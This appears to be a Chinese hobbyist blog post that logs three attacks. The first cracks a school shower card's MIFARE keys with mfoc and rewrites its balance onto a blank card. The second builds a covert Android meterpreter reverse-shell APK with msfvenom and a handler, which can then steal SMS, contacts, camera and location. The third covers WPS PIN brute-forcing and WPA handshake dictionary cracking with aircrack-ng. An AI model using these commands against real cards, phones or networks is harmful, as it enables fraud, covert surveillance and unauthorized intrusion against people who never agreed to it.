刷洗澡卡

使用PN532对学校的洗澡卡进行写和读，学校的洗澡卡数据部分放在了3和4扇区。

  • mfoc -o 对卡进行破解，如果找到了key A或者key B，可以读取整个卡的数据，dump成16进制文件，这个文件中的3扇区有价格的内容，16进制数字需要倒过来进行存放，行尾还有一个校验位，卡的最高改动额度为650左右。
  • 在将改过的数据写入白卡中即可。

渗透Android手机

Metasploit

以前总觉得Metaspoit很高大上，确实也是很厉害的工具，自己以前装Kali没兴趣弄，现在用OSX，又来了点兴趣。

其实步骤很简单，Mac下载pkg就可以安装。安装后文件在目录下：

    /opt/metasploit-framework/
首先生成一个Android的Payload文件：
    #lhost是服务端的IP地址 rhost是Payload的地址 同理lport    
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.102 LPORT=443 > ~/Desktop/Hack/Poly.apk
安装apk程序后，实际是一个简单的MainFrameWork，一般都应该是嵌到有实际功能的apk中。申请了权限户可以进行数据收集，不易被察觉。
Payload的安装后，可以开启msfconsole进行渗透。 
    #在/opt/metasploit-framework/bin目录下 sudo ./msfconsole 因为1024以内的端口都需要root权限  
    use exploit/multi/handler  
    set PAYLOAD android/meterpreter/reverse_tcp  
    set LHOST 192.168.2.102  
    set LPORT 443  
    exploit   

    #使用sessions -i 1选择会话进入

进入Android的session后，可以sysinfo查看系统信息，进入文件系统查看下载，dump短信、通信录、最近消息。

还可以截图，web_stream，只要给了权限，应用可以监视你的任何操作。

摄像头，屏幕，地理位置，联系人都可以获取到。

这只是Metasploit的一小部分，它还可以正向突破，还可以获取Windows、Linux的提权，有待发现！

路由器破解

跑pin

需要路由器开启wps,使用wps生成的pin码，8位，可以直接登录路由器，前4位验证不合，会直接返回错误，所以前四位跑破解10K，后四位中，最后一位是校验位，所以后四位一共跑1k，总的计算次数只需要最多11k次。就能够破解

跑字典

如果没有开启wps，可以通过抓包，对抓到的验证信息进行跑密码字典破解。

在Mac上步骤

    #查看ssid对应的channel和信号强度 选取信号强的ch进行sniff  
    sudo airport -s   
    #sniff 选择的ch  
    sudo airport en0 sniff [CH]  

    ##结果会保存到/tmp/目录下 是一个cap文件 保存了监测到的数据包  

    #选择1 handshake的ssid进行破解跑字典  
    sudo aircrack-ng -w /path/to/字典 /path/to/数据包.cap

尝试了要几次，可能没有人使用网络，获取到的cap没有1 handshake的数据包。但是原理基本就是这样。

就算获取到了可以跑字典的数据包，如果密码强度高，自己的字典中没有，也是没戏，又或者字典很大，需要跑很久的字典。淘宝上有专门的服务可以帮忙跑字典获取pass。

所以，如果不是特别的evil，这个还是没有很大的用处，只是听起来比较Geek，问别人一声，wifi 密码是多少也挺好的。
